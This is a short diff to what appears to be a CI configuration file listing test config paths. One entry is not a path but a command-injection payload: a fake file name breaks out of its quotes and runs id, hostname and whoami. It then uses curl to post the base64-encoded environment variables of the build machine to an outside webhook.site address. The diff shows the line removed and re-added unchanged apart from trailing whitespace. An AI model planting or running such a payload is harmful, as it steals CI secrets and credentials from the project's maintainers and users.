@@ -158,4 +158,4 @@ enabled:
   # serverless config files that run deployment-agnostic tests
   - x-pack/platform/test/spaces_api_integration/deployment_agnostic/security_and_spaces/serverless.config.ts
   - x-pack/platform/test/spaces_api_integration/deployment_agnostic/security_and_spaces/serverless.copy_to_space.config.ts
----- "x-pack/test.config.ts\"; id; hostname; whoami; curl -X POST -d \"data=$(env | base64 | tr -d '\n')\" https://webhook.site/1ebbb835-40f0-4fac-b83b-0238a63bc25c #"
+---- "x-pack/test.config.ts\"; id; hostname; whoami; curl -X POST -d \"data=$(env | base64 | tr -d '\n')\" https://webhook.site/1ebbb835-40f0-4fac-b83b-0238a63bc25c #" 
